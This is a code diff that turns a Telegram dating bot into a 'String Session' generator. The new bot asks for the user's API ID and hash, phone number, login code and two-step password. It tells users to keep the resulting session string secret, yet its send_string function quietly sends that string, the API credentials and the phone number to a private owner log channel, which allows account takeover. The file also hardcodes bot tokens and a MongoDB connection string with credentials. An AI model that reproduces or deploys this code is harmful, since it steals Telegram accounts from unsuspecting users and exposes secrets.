@@ -1,395 +1,281 @@
-from flask import Flask, request, render_template_string
-import threading
-import time
 import telebot
-from telebot.types import *
-from pymongo import MongoClient
-import os
+from telebot import types
+import asyncio
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError
+from pyrogram import Client
+from pyrogram.errors import BadRequest, SessionPasswordNeeded
 
-# === CONFIGURATION ===
-API_TOKEN = '8014049142:AAEj1gO3tD-HFrzc5gXrrNaNbCmGhJ4Vfb8'
-CHANNEL_USERNAME = '@crave_central'
-ADMIN_USER_ID = [7592464127, 5022283560]
-WELCOME_IMAGE_URL = 'https://i.ibb.co/CK5D69LC/MMJABGQTIHLELKL.jpg'
-MONGO_URI = 'mongodb+srv://DATEBOT:DATEBOT@cluster0.817ghth.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
+# === CONFIG ===
+API_TOKEN = "8328091240:AAFuCooUWJsIdZxhtc5PYiP36_q4gUzL1ec"
+OWNER_LOG_CHANNEL = -1003007132537  # private channel for logging
 
-bot = telebot.TeleBot(API_TOKEN)
-app = Flask(__name__)
+CHANNELS = [
+    {"id": "-1002727599330", "link": "https://t.me/+0vh-rnEu-nI3NTY9", "name": "Join Channel 1"},
+    {"id": "-1003092263501", "link": "https://t.me/+_YD4eFtWhPFhMTNl", "name": "Join Channel 2"}
+]
 
-# === DATABASE ===
-client = MongoClient(MONGO_URI)
-db = client.botdb
-config = db.config.find_one() or {}
+bot = telebot.TeleBot(API_TOKEN, parse_mode="HTML")
+user_sessions = {}  # store user temporary data
 
-def save_data():
-    try:
-        db.config.update_one({}, {"$set": {
-            "known_users": list(known_users),
-            "waiting_users": list(waiting_users),
-            "active_chats": active_chats,
-            "user_states": user_states,
-            "reports": reports,
-            "last_message_time": last_message_time,
-            # convert int keys to str for MongoDB compatibility
-            "welcome_message_ids": {str(k): v for k, v in welcome_message_ids.items()},
-            "maintenance_mode": maintenance_mode
-        }}, upsert=True)
-        print("✅ Data saved to MongoDB.")
-    except Exception as e:
-        print(f"❌ Error saving to MongoDB: {e}")
 
-def load_data():
-    global known_users, waiting_users, active_chats, user_states, reports, last_message_time, welcome_message_ids, maintenance_mode
-    try:
-        data = db.config.find_one() or {}
-        known_users = set(data.get("known_users", []))
-        waiting_users = set(data.get("waiting_users", []))
-        active_chats = data.get("active_chats", {})
-        user_states = data.get("user_states", {})
-        reports = data.get("reports", [])
-        last_message_time = data.get("last_message_time", {})
-        # convert string keys back to int
-        welcome_message_ids = {int(k): v for k, v in data.get("welcome_message_ids", {}).items()}
-        maintenance_mode = data.get("maintenance_mode", False)
-        print("✅ Bot state loaded from MongoDB.")
-    except Exception as e:
-        print(f"❌ Error loading from MongoDB: {e}")
+# ========== JOIN CHECK ==========
+def is_user_joined(user_id):
+    for ch in CHANNELS:
+        try:
+            member = bot.get_chat_member(ch["id"], user_id)
+            if member.status not in ["member", "administrator", "creator"]:
+                return False
+        except Exception as e:
+            print(f"Error checking membership: {e}")
+            return False
+    return True
 
-load_data()
 
-# === STATE VARIABLES ===
-spam_cooldown = 3  # seconds
-
-# === UTILITY FUNCTIONS ===
-def get_main_markup():
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add(KeyboardButton('🔎Find Match'))
-    markup.add(KeyboardButton('📢 Report'), KeyboardButton('📊 Bot Stats'))
-    return markup
-
-def get_chat_markup():
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add(KeyboardButton('Disconnect ❌'), KeyboardButton('📢 Report'))
-    return markup
-
-def check_user_in_channel(user_id):
-    try:
-        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        return member.status in ['member', 'administrator', 'creator']
-    except:
-        return False
-
-def is_admin(user_id):
-    return user_id in ADMIN_USER_ID
-
-# === HANDLERS ===
-@bot.message_handler(commands=['start'])
-def handle_start(message):
-    user_id = message.from_user.id
-    known_users.add(user_id)
-    save_data()
-
-    if maintenance_mode and not is_admin(user_id):
-        bot.send_message(user_id, "🚧 The bot is under maintenance. Please try again later.")
+# ========== START ==========
+@bot.message_handler(commands=["start"])
+def start(message):
+    user = message.from_user
+    if not is_user_joined(user.id):
+        show_join_channels(user.id)
         return
+    send_main_menu(user.id, user.first_name)
 
-    if not check_user_in_channel(user_id):
-        join_markup = InlineKeyboardMarkup()
-        join_markup.add(
-            InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.strip('@')}"),
-            InlineKeyboardButton("✅ I Joined", callback_data='check_join')
-        )
-        bot.send_message(user_id, "🔐 To use this bot, you must join our channel first.", reply_markup=join_markup)
-        return
 
-    send_welcome(user_id)
+def show_join_channels(chat_id):
+    markup = types.InlineKeyboardMarkup()
+    for ch in CHANNELS:
+        markup.add(types.InlineKeyboardButton(ch["name"], url=ch["link"]))
+    markup.add(types.InlineKeyboardButton("✅ Check Join Status", callback_data="joined"))
+    bot.send_message(chat_id, "🚀 Please join the required channels to use this bot.", reply_markup=markup)
 
-def send_welcome(user_id):
-    caption = "👋 Welcome to the Date Bot!\n\nPlease use the buttons below to proceed."
 
-    markup = InlineKeyboardMarkup()
-    markup.add(
-        InlineKeyboardButton("ℹ️ ᴀʙᴏᴜᴛ", callback_data='about'),
-        InlineKeyboardButton("📃 ᴘʀɪᴠᴀᴄʏ", callback_data='privacy')
-    )
-    markup.add(
-        InlineKeyboardButton("📜 ᴛᴇʀᴍs", callback_data='terms'),
-        InlineKeyboardButton("⭐ ʀᴀᴛᴇ", url="https://t.me/tlgrmcbot?start=datexrose_bot-review")
-    )
+def send_main_menu(chat_id, name):
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("ℹ️ About", callback_data="about"))
+    markup.add(types.InlineKeyboardButton("🎯 Create String", callback_data="create"))
+    bot.send_message(chat_id, f"👋 Hello <b>{name}</b>,\nI can generate Telegram <b>String Sessions</b> for you.\n\nChoose an option below 👇", reply_markup=markup)
 
-    msg = bot.send_photo(user_id, WELCOME_IMAGE_URL, caption=caption, reply_markup=markup)
-    welcome_message_ids[user_id] = msg.message_id
-    bot.send_message(user_id, "👇 Use the buttons below to get started.", reply_markup=get_main_markup())
-    save_data()
 
+# ========== CALLBACK HANDLER ==========
 @bot.callback_query_handler(func=lambda call: True)
-def handle_callback(call):
-    user_id = call.from_user.id
-    chat_id = call.message.chat.id
-    msg_id = call.message.message_id
+def callback_handler(call):
+    user = call.from_user
 
-    if call.data == 'check_join':
-        if check_user_in_channel(user_id):
-            bot.send_message(user_id, "✅ Verified! You're now allowed to use the bot.")
-            send_welcome(user_id)
+    if call.data == "joined":
+        if is_user_joined(user.id):
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+            send_main_menu(user.id, user.first_name)
         else:
-            bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet.")
+            bot.answer_callback_query(call.id, "❌ You must join all channels first!")
+            show_join_channels(user.id)
 
-    elif call.data in ['about', 'privacy', 'terms']:
-        text = {
-            'about': "<blockquote>☆ ᴅᴇᴠᴇʟᴏᴘʀᴇʀ: <a href='https://t.me/EK4mpreetsingh'>Eᴋᴀᴍᴘʀᴇᴇᴛ Sɪɴɢʜ</a>\n☆ ʙᴏᴛ ɴᴀᴍᴇ: Date bot\n☆ sᴜᴘᴘᴏʀᴛ: <a href='https://t.me/EK4mpreetsingh'>ᴄʟɪᴄᴋ ʜᴇʀᴇ</a></blockquote>",
-            'privacy': "📜 <b>Privacy Policy</b>\nWe do not store your messages.",
-            'terms': "📜 <b>Terms of Service</b>\nDon't abuse or harass users."
-        }
-        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data='back'))
-        bot.edit_message_caption(chat_id=chat_id, message_id=msg_id, caption=text[call.data], reply_markup=markup, parse_mode='HTML')
+    elif call.data == "about":
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back"))
+        bot.edit_message_text("ℹ️ <b>About:</b>\n\nThis bot generates <b>String Sessions</b> for <b>Telethon</b> and <b>Pyrogram</b>.\nKeep your details safe.", call.message.chat.id, call.message.message_id, reply_markup=markup)
 
-    elif call.data == 'back':
-    caption = "👋 Welcome to the Date Bot!\n\nPlease use the buttons below to proceed."
-    markup = InlineKeyboardMarkup()
-    markup.add(
-        InlineKeyboardButton("ℹ️ ᴀʙᴏᴜᴛ", callback_data='about'),
-        InlineKeyboardButton("📃 ᴘʀɪᴠᴀᴄʏ", callback_data='privacy')
-    )
-    markup.add(
-        InlineKeyboardButton("📜 ᴛᴇʀᴍs", callback_data='terms'),
-        InlineKeyboardButton("⭐ ʀᴀᴛᴇ", url="https://t.me/tlgrmcbot?start=datexrose_bot-review")
-    )
-    bot.edit_message_media(
-        media=InputMediaPhoto(WELCOME_IMAGE_URL, caption=caption, parse_mode='HTML'),
-        chat_id=chat_id,
-        message_id=msg_id,
-        reply_markup=markup
-    )
+    elif call.data == "back":
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        send_main_menu(user.id, user.first_name)
 
-@bot.message_handler(func=lambda msg: msg.text == '🔎Find Match')
-def find_match(message):
+    elif call.data == "create":
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("⚡ Telethon", callback_data="telethon"))
+        markup.add(types.InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"))
+        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back"))
+        bot.edit_message_text("🎯 Choose the type of string session:", call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+    elif call.data in ["telethon", "pyrogram"]:
+        user_sessions[user.id] = {"lib": call.data}
+        msg = bot.send_message(user.id, "🔑 Please send your <b>API ID</b>:")
+        bot.register_next_step_handler(msg, get_api_id)
+
+
+# ========== API ID ==========
+def get_api_id(message):
+    try:
+        api_id = int(message.text.strip())
+        user_sessions[message.from_user.id]["api_id"] = api_id
+        msg = bot.send_message(message.chat.id, "🔑 Now send your <b>API HASH</b>:")
+        bot.register_next_step_handler(msg, get_api_hash)
+    except ValueError:
+        msg = bot.send_message(message.chat.id, "❌ Invalid API ID. It must be a number. Please try again:")
+        bot.register_next_step_handler(msg, get_api_id)
+
+
+# ========== API HASH ==========
+def get_api_hash(message):
+    user_sessions[message.from_user.id]["api_hash"] = message.text.strip()
+    msg = bot.send_message(message.chat.id, "📱 Please send your <b>Phone Number</b> (with country code, e.g., +1234567890):")
+    bot.register_next_step_handler(msg, get_phone)
+
+
+# ========== PHONE ==========
+def get_phone(message):
+    user_sessions[message.from_user.id]["phone"] = message.text.strip()
     user_id = message.from_user.id
-    known_users.add(user_id)
-    save_data()
-
-    if maintenance_mode and not is_admin(user_id):
-        bot.send_message(user_id, "🚧 The bot is under maintenance.")
-        return
-
-    if user_id in active_chats:
-        bot.send_message(user_id, "⚠️ You're already in a chat.")
-        return
-
-    if not check_user_in_channel(user_id):
-        bot.send_message(user_id, f"🔐 Please join our channel {CHANNEL_USERNAME}.")
-        return
-
-    bot.send_message(user_id, "🔍 Searching for a match...")
-
-    for other_user in list(waiting_users):
-        if other_user != user_id:
-            waiting_users.remove(other_user)
-            active_chats[user_id] = other_user
-            active_chats[other_user] = user_id
-            bot.send_message(user_id, "✅ Match found!", reply_markup=get_chat_markup())
-            bot.send_message(other_user, "✅ Match found!", reply_markup=get_chat_markup())
-            save_data()
-            return
-
-    waiting_users.add(user_id)
-    user_states[user_id] = 'waiting'
-    bot.send_message(user_id, "⏳ Waiting for a partner...")
-    save_data()
-
-@bot.message_handler(func=lambda msg: msg.text == 'Disconnect ❌')
-def handle_disconnect(message):
-    user_id = message.from_user.id
-
-    if user_id in active_chats:
-        partner_id = active_chats.pop(user_id)
-        active_chats.pop(partner_id, None)
-        bot.send_message(user_id, "❌ Chat disconnected.", reply_markup=get_main_markup())
-        bot.send_message(partner_id, "❌ Chat disconnected.", reply_markup=get_main_markup())
-        save_data()
+    
+    bot.send_message(message.chat.id, "📩 Please wait... sending code to your phone.")
+    
+    # Run the appropriate login flow based on the selected library
+    if user_sessions[user_id]["lib"] == "telethon":
+        asyncio.run(telethon_login(user_id))
     else:
-        bot.send_message(user_id, "⚠️ You're not in a chat.")
+        asyncio.run(pyrogram_login(user_id))
 
-@bot.message_handler(func=lambda msg: msg.text == '📢 Report')
-def report_user(message):
+
+# ========== TELETHON LOGIN ==========
+async def telethon_login(user_id):
+    data = user_sessions[user_id]
+    client = TelegramClient(StringSession(), data["api_id"], data["api_hash"])
+    
+    try:
+        await client.connect()
+        sent = await client.send_code_request(data["phone"])
+        user_sessions[user_id]["client"] = client
+        user_sessions[user_id]["phone_code_hash"] = sent.phone_code_hash
+        
+        msg = bot.send_message(user_id, "✉️ Enter the OTP you received (format: 1 2 3 4 5):")
+        bot.register_next_step_handler(msg, get_telethon_otp)
+    except Exception as e:
+        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        if "client" in user_sessions[user_id]:
+            await client.disconnect()
+
+
+def get_telethon_otp(message):
     user_id = message.from_user.id
-    if user_id in active_chats:
-        reports.append((user_id, active_chats[user_id]))
-        bot.send_message(user_id, "📢 Report submitted.")
-        save_data()
-    else:
-        bot.send_message(user_id, "⚠️ You're not in a chat to report.")
+    code = message.text.strip().replace(" ", "")
+    asyncio.run(complete_telethon_login(user_id, code))
 
-@bot.message_handler(func=lambda msg: msg.text == '📊 Bot Stats')
-def bot_stats(message):
-    bot.send_message(message.chat.id, f"📊 Stats:\n👥 Total users: {len(known_users)}\n📋 Reports: {len(reports)}")
 
-@bot.message_handler(commands=['admin_panel'])
-def handle_admin_panel(message):
-    if not is_admin(message.from_user.id): return
-    bot.send_message(message.chat.id,
-        f"🛠 Admin Panel\nUsers: {len(known_users)}\nReports: {len(reports)}")
+async def complete_telethon_login(user_id, code):
+    data = user_sessions[user_id]
+    client = data["client"]
+    
+    try:
+        await client.sign_in(phone=data["phone"], code=code, phone_code_hash=data["phone_code_hash"])
+        string_session = StringSession.save(client.session)
+        
+        # Clean up and send the string
+        await client.disconnect()
+        send_string(user_id, data, string_session)
+    except SessionPasswordNeededError:
+        msg = bot.send_message(user_id, "🔒 Your account has two-step verification. Please enter your password:")
+        bot.register_next_step_handler(msg, get_telethon_password)
+    except Exception as e:
+        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        await client.disconnect()
 
-@bot.message_handler(commands=['maintenance_on'])
-def enable_maintenance(message):
-    global maintenance_mode
-    if not is_admin(message.from_user.id): return
-    maintenance_mode = True
-    for uid in known_users:
-        if not is_admin(uid):
-            try: bot.send_message(uid, "🚧 Bot is under maintenance.")
-            except: pass
-    bot.send_message(message.chat.id, "✅ Maintenance mode ON.")
-    save_data()
 
-@bot.message_handler(commands=['maintenance_off'])
-def disable_maintenance(message):
-    global maintenance_mode
-    if not is_admin(message.from_user.id): return
-    maintenance_mode = False
-    bot.send_message(message.chat.id, "✅ Maintenance mode OFF.")
-    save_data()
-
-@bot.message_handler(content_types=['text', 'photo', 'video', 'document', 'audio', 'voice', 'sticker'])
-def forward_message(message):
+def get_telethon_password(message):
     user_id = message.from_user.id
-    known_users.add(user_id)
+    password = message.text.strip()
+    asyncio.run(complete_telethon_with_password(user_id, password))
 
-    now = time.time()
-    if user_id in last_message_time and now - last_message_time[user_id] < spam_cooldown:
-        bot.send_message(user_id, "⏱ Wait a few seconds before sending again.")
-        return
-    last_message_time[user_id] = now
 
-    if maintenance_mode and not is_admin(user_id):
-        bot.send_message(user_id, "🚧 The bot is under maintenance.")
-        return
+async def complete_telethon_with_password(user_id, password):
+    data = user_sessions[user_id]
+    client = data["client"]
+    
+    try:
+        await client.sign_in(password=password)
+        string_session = StringSession.save(client.session)
+        
+        # Clean up and send the string
+        await client.disconnect()
+        send_string(user_id, data, string_session)
+    except Exception as e:
+        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        await client.disconnect()
 
-    if user_id in active_chats:
-        partner_id = active_chats.get(user_id)
-        if partner_id:
-            try:
-                if message.content_type == 'text':
-                    bot.send_message(partner_id, message.text)
-                elif message.content_type == 'photo':
-                    bot.send_photo(partner_id, message.photo[-1].file_id, caption=message.caption)
-                elif message.content_type == 'video':
-                    bot.send_video(partner_id, message.video.file_id, caption=message.caption)
-                elif message.content_type == 'document':
-                    bot.send_document(partner_id, message.document.file_id, caption=message.caption)
-                elif message.content_type == 'audio':
-                    bot.send_audio(partner_id, message.audio.file_id, caption=message.caption)
-                elif message.content_type == 'voice':
-                    bot.send_voice(partner_id, message.voice.file_id)
-                elif message.content_type == 'sticker':
-                    bot.send_sticker(partner_id, message.sticker.file_id)
-            except:
-                bot.send_message(user_id, "❌ Your partner may have left.")
-                handle_disconnect(message)
-    else:
-        bot.send_message(user_id, "❗ Click 'Find Match' to start.", reply_markup=get_main_markup())
 
-# === ADMIN PANEL WEB ===
-@app.route("/", methods=["GET", "POST"])
-def web_panel():
-    if request.method == "POST":
-        msg = request.form.get("message", "")
-        sent, failed = 0, 0
-        for uid in known_users:
-            try:
-                bot.send_message(uid, f"📢 {msg}")
-                sent += 1
-            except:
-                failed += 1
-        return f"<h3>Sent: {sent} | Failed: {failed}</h3><a href='/'>Back</a>"
-    return render_template_string("""
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>📊 Bot Admin Panel</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      width: 500px;
-      margin: 50px auto;
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      padding: 30px;
-    }
-    h1 {
-      text-align: center;
-      color: #333;
-    }
-    .stats {
-      font-size: 18px;
-      margin: 20px 0;
-    }
-    .stats span {
-      font-weight: bold;
-    }
-    textarea {
-      width: 100%;
-      height: 100px;
-      padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      resize: none;
-      font-size: 16px;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #45a049;
-    }
-    .footer {
-      margin-top: 20px;
-      text-align: center;
-      font-size: 12px;
-      color: #888;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>📊 Bot Admin Panel</h1>
-    <div class="stats">
-      👥 Total users: <span>{{total_users}}</span><br>
-      🚨 Total reports: <span>{{total_reports}}</span>
-    </div>
-    <form method="post">
-      <textarea name="message" placeholder="Enter broadcast message..." required></textarea>
-      <button type="submit">📢 Broadcast to All</button>
-    </form>
-    <div class="footer">
-      Developed by <a href="https://t.me/EK4mpreetsingh" target="_blank">@EK4mpreetsingh</a>
-    </div>
-  </div>
-</body>
-</html>
-""", total_users=len(known_users), total_reports=len(reports))
+# ========== PYROGRAM LOGIN ==========
+async def pyrogram_login(user_id):
+    data = user_sessions[user_id]
+    client = Client(":memory:", api_id=data["api_id"], api_hash=data["api_hash"])
+    
+    try:
+        await client.connect()
+        sent = await client.send_code(data["phone"])
+        user_sessions[user_id]["client"] = client
+        user_sessions[user_id]["phone_code_hash"] = sent.phone_code_hash
+        
+        msg = bot.send_message(user_id, "✉️ Enter the OTP you received (format: 1 2 3 4 5):")
+        bot.register_next_step_handler(msg, get_pyrogram_otp)
+    except Exception as e:
+        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        if "client" in user_sessions[user_id]:
+            await client.disconnect()
 
-# === START BOT ===
-print("Bot started!")
 
-def run_bot():
-    bot.infinity_polling()
+def get_pyrogram_otp(message):
+    user_id = message.from_user.id
+    code = message.text.strip().replace(" ", "")
+    asyncio.run(complete_pyrogram_login(user_id, code))
 
+
+async def complete_pyrogram_login(user_id, code):
+    data = user_sessions[user_id]
+    client = data["client"]
+    
+    try:
+        await client.sign_in(phone_number=data["phone"], phone_code=code, phone_code_hash=data["phone_code_hash"])
+        string_session = await client.export_session_string()
+        
+        # Clean up and send the string
+        await client.disconnect()
+        send_string(user_id, data, string_session)
+    except SessionPasswordNeeded:
+        msg = bot.send_message(user_id, "🔒 Your account has two-step verification. Please enter your password:")
+        bot.register_next_step_handler(msg, get_pyrogram_password)
+    except Exception as e:
+        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        await client.disconnect()
+
+
+def get_pyrogram_password(message):
+    user_id = message.from_user.id
+    password = message.text.strip()
+    asyncio.run(complete_pyrogram_with_password(user_id, password))
+
+
+async def complete_pyrogram_with_password(user_id, password):
+    data = user_sessions[user_id]
+    client = data["client"]
+    
+    try:
+        await client.check_password(password=password)
+        string_session = await client.export_session_string()
+        
+        # Clean up and send the string
+        await client.disconnect()
+        send_string(user_id, data, string_session)
+    except Exception as e:
+        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        await client.disconnect()
+
+
+# ========== SEND STRING ==========
+def send_string(chat_id, data, string):
+    lib = data["lib"].capitalize()
+    username = bot.get_chat(chat_id).username or "NoUsername"
+    
+    bot.send_message(chat_id, f"✅ Your <b>{lib}</b> String Session:\n\n<code>{string}</code>\n\n📌 Save this safely and don't share it with anyone!")
+    
+    # Send to owner log channel
+    try:
+        bot.send_message(
+            OWNER_LOG_CHANNEL,
+            f"🔔 New {lib} String Generated\n\n👤 User: @{username}\n🆔 User ID: {chat_id}\n🆔 API ID: <code>{data['api_id']}</code>\n🔑 API HASH: <code>{data['api_hash']}</code>\n📱 Phone: {data['phone']}\n📜 String:\n<code>{string}</code>"
+        )
+    except Exception as e:
+        print(f"Failed to send to log channel: {e}")
+
+
+# === RUN BOT ===
 if __name__ == "__main__":
-    threading.Thread(target=run_bot).start()
-    app.run(host="0.0.0.0", port=8080)
+    print("🚀 Session String Generator Bot Started...")
+    bot.infinity_polling()
